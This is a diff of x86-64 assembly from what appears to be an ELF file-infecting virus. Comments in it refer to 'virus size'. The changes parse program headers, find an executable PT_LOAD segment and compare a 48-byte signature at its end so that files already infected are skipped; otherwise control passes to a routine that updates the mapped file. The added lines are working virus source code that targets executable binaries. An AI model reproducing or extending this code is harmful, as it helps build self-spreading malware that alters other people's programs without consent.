@@ -2,6 +2,7 @@ section .text
 	global _treat_file
 	global _final_end
 	extern _update_mmaped_file
+	extern _string
 
 _file_size:
 	enter 24, 0
@@ -24,11 +25,15 @@ _file_size:
 	ret
 
 _treat_file:
-	enter 64, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
+	enter 80, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
 				; rsp + 0 bytes for fd
 				; rsp + 8 bytes for virus size
 				; rsp + 16 bytes for file size
 				; rsp + 24 bytes for mmap return address
+				; rsp + 32 phdr
+				; rsp + 40 actual phnum
+				; rsp + 48 ehdr->e_phnum
+				; rsp + 56 supposed string of file
 	cmp rdi, 0
 	je _final_end
 	mov QWORD [rsp + 8], rsi
@@ -80,6 +85,70 @@ _read_file_header_64:
 ;; check the file type, only exec files are treated
 	cmp WORD [rdi + 16], 2
 	jne _final_end
+;; check if our string is already in the file.
+	mov r10, QWORD [rsp + 24]
+	mov QWORD [rsp + 32], r10
+	add QWORD [rsp + 32], 32
+	mov r10, QWORD [rsp + 32]
+	mov r10, QWORD [r10]
+	mov QWORD [rsp + 32], r10
+	mov r10, QWORD [rsp + 24]
+	add QWORD [rsp + 32], r10
+	mov QWORD [rsp + 40], 0
+	mov r10, QWORD [rsp + 24]
+	mov QWORD [rsp + 48], r10
+	add QWORD [rsp + 48], 56
+	mov r11, QWORD [rsp + 48]
+	xor r10, r10
+	mov r10w, WORD [r11]
+;	mov r10w, WORD [r11]
+	mov QWORD [rsp + 48], r10
+
+_loop_verif:
+	mov r10, QWORD [rsp + 40]
+	cmp r10, QWORD [rsp + 48]
+	jge _final_end
+	mov r10, QWORD [rsp + 32]
+	cmp DWORD [r10], 1
+	jne _inc_before_reloop
+	add r10, 4
+	mov r10d, DWORD [r10]
+	and r10d, 1
+	cmp r10d, 1
+	jne _inc_before_reloop
+; we find pt_load
+	mov r10, QWORD [rsp + 32]
+	add r10, 8
+	mov r10, QWORD [r10]
+	mov QWORD [rsp + 56], r10
+	mov r10, QWORD [rsp + 32]
+	add r10, 32
+	mov r10, QWORD [r10]
+	add QWORD [rsp + 56], r10
+	mov r10, QWORD [rsp + 8]
+	sub QWORD [rsp + 56], r10
+	mov r10, QWORD [rsp + 24]
+	add QWORD [rsp + 56], r10
+	jmp _init_cmp_loop
+
+_inc_before_reloop:
+	add QWORD [rsp + 32], 56
+	inc QWORD [rsp + 40]
+	jmp _loop_verif
+
+_init_cmp_loop:
+	xor rcx, rcx
+	mov rdi, QWORD [rsp + 56]
+	lea rsi, [rel _string]
+
+_cmp:
+	cmp rcx, 48
+	jge _munmap
+	mov r10, QWORD [rsi + rcx]
+	cmp r10, QWORD [rdi + rcx]
+	jne _call_mmaped_update
+	add rcx, 8
+	jmp _cmp
 
 _call_mmaped_update:
 	mov rdi, QWORD [rsp + 24]
